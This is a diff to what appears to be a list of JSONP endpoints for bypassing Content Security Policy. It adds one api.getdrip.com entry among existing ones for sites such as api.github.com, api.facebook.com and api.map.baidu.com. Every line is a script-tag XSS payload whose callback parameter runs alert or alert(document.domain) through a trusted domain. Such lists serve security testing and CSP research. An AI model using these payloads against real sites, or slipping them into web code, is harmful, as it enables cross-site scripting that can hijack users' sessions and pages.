@@ -12,6 +12,7 @@ api.dailymotion.com	<script src="https://api.dailymotion.com/video/x5gv6be?callb
 api.duckduckgo.com	<script src="https://api.duckduckgo.com/?q=x&callback=alert&format=json"></script>
 api.facebook.com	<script src="https://api.facebook.com/restserver.php?method=fql.query&callback=alert"></script>
 api.flickr.com	<script src="https://api.flickr.com/services/feeds/photos_friends.gne?user_id=44979707@N00&friends=0&display_all=1&format=json&jsoncallback=alert"></script>
+api.getdrip.com	<script src="https://api.getdrip.com/client/forms/show?callback=alert(1)-"></script>
 api.github.com	<script src="https://api.github.com/gist/anything?callback=alert"></script>
 api.m.jd.com	<script src="https://api.m.jd.com/api?appid=x&functionId=x&jsonp=alert(document.domain)//"></script>
 api.map.baidu.com	<script src="https://api.map.baidu.com/api?v=2.0&ak=&s=1&callback=alert(document.domain)"></script>
